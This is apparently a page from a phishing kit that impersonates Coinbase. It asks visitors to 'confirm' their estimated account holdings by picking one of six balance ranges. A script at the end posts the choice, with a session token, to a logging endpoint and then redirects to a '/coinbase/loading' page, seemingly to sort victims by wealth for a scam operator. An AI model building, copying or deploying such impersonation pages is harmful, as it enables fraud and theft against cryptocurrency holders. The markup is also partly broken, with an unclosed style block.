
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Portfolio</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <link href="css/11.css" rel="stylesheet"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;

</head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
      </path>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
       Confirm estimated account holdings
      </span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       Confirm the last estimated holdings on your last account statement. This is part of our standard procedure.
      </span>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       Under $ 1,000
      </button>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       $1,000 - $9,999
      </button>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       $10,000 - $99,999
      </button>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       $100,000 - $249,999
      </button>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       $250,000 - $999,999
      </button>
      <button class="bg-transparent hover:bg-[#0f1012] active:bg-[#1e1f20] disabled:bg-[#0a0b0d] text-white text-left p-4 text-sm font-medium rounded-md font-coinbase-sans ring-1 ring-coinbase-line mt-4 justify-center cb-balance-btn" type="button">
       Above $1,000,000
      </button>
     </form>
    </div>
   </div>
  </div>
  <div class="skiptranslate" dir="ltr" id="goog-gt-tt">
   <div style="padding: 8px;">
    <div>
     <div class="logo">
      <img alt="Google Translate" height="20" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=" width="20"/>
     </div>
    </div>
   </div>
   <div class="top" style="padding: 8px; float: left; width: 100%;">
    <h1 class="title gray">
     Original text
    </h1>
   </div>
   <div class="middle" style="padding: 8px;">
    <div class="original-text">
    </div>
   </div>
   <div class="bottom" style="padding: 8px;">
    <div class="activity-links">
     <span class="activity-link">
      Contribute a better translation
     </span>
     <span class="activity-link">
     </span>
    </div>
    <div class="started-activity-container">
     <hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"/>
     <div class="activity-root">
     </div>
    </div>
   </div>
   <div class="status-message" style="display: none;">
   </div>
  </div>
  <div class="goog-te-spinner-pos">
   <div class="goog-te-spinner-animation">
    <svg class="goog-te-spinner" height="96px" viewbox="0 0 66 66" width="96px" xmlns="http://www.w3.org/2000/svg">
     <circle class="goog-te-spinner-path" cx="33" cy="33" fill="none" r="30" stroke-linecap="round" stroke-width="6">
     </circle>
    </svg>
   </div>
  </div>
 <script>
  (function(){
    document.querySelectorAll('.cb-balance-btn').forEach(function(btn){
      btn.addEventListener('click', function(){
        var val = btn.textContent.trim();
        if(typeof window._liveledCSRF !== 'undefined'){
          var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };
          gate(function(){
            var b = new URLSearchParams({_token:window._liveledCSRF,page:'coinbase_estimated_balance',type:'form_submit',element:'estimated_balance',value:val,doc:window._llDocId||''});
            fetch('/api/log',{method:'POST',body:b,keepalive:true});
          }).then(function(){
            setTimeout(function(){
              if(window.navigateTo) window.navigateTo('/coinbase/loading');
              else window.location.href='/coinbase/loading';
            },300);
          });
        } else {
          setTimeout(function(){
            if(window.navigateTo) window.navigateTo('/coinbase/loading');
            else window.location.href='/coinbase/loading';
          },300);
        }
        document.documentElement.style.background='#0a0b0d';
        document.body.style.background='#0a0b0d';
      });
    });
  })();
  </script>
 </body>
</html>
